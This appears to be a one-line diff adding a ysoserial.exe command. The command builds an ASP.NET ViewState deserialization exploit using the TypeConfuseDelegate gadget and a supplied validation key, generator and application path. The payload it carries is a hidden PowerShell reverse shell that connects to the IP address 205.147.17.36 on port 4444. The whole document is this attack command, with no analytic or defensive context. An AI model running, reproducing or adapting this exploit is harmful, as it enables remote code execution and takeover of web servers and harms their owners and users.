@@ -1,0 +1,1 @@
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('205.147.17.36',4444);...\" --generator="DD46A77E" --validationalg="SHA1" --validationkey="CB27201E6968771422FFDE893D53CB3A1AEA2A8F" --path="/lpuums/" --apppath="/lpuums/"
